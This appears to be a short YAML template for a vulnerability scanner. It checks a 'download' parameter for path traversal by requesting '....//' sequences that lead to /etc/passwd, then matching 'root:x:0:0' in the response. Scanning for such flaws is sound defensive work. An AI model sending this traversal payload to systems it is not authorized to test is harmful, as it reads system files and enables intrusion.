id: lfi6-0969
name: 'Traversal in download'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via download'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      download:
        - '....//....//....//....//....//....//....//etc/passwd'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
